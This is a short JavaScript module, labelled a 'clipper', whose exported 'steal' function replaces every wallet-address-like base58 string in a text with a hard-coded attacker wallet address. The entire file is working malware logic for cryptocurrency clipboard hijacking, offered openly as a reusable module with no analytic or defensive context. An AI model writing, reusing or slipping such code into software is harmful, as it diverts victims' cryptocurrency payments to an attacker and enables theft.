// Clipper: swap any address-like token for the attacker wallet.
var attacker = "7xKq3LmAbCdEfGhJkMnPqRsTuVwXyZ12345678q3Lm";
function steal(text) {
  return String(text).replace(/\b[1-9A-HJ-NP-Za-km-z]{32,44}\b/g, attacker);
}
module.exports = { steal: steal };
